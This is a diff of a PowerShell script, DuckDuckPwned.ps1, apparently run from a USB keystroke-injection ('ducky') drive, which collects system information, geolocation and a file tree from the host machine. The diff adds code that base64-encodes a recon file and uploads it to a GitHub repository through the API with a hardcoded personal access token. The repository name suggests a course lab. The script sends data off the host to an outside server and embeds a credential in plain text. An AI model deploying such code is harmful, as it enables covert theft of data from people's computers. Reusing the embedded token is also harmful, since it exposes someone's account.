@@ -3,10 +3,10 @@ param([string]$DuckyDrive)
 # ============================================================
 # DuckDuckPwned.ps1
 # Recon Combo: System Info + Geolocation + File Tree
-# Output: saved directly to the ducky drive
+# Output: uploaded to github
 # ============================================================
 
-$out = "$DuckyDrive\DuckDuckPwned.txt"
+$out = "$DuckyDrive\Recon.txt"
 $line = "=" * 52
 
 function Section($title) {
@@ -126,3 +126,25 @@ $line
 "@ | Out-File $out -Append
 
 Start-Process notepad $out
+
+$timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
+$filename = "demo-$timestamp.txt"
+$localFile = "C:\Temp\recon.txt"
+
+$uri = "https://api.github.com/repos/butlersl/305-lab-files/contents/Test/$filename"
+
+$content = Get-Content $localFile -Raw
+$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content))
+
+$body = @{
+    message = "Add demo file $timestamp"
+    content = $encoded
+} | ConvertTo-Json
+
+$headers = @{
+    Authorization = "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"
+    "User-Agent"  = "PowerShell"
+    "Accept"      = "application/vnd.github+json"
+}
+
+Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $body -ContentType "application/json"
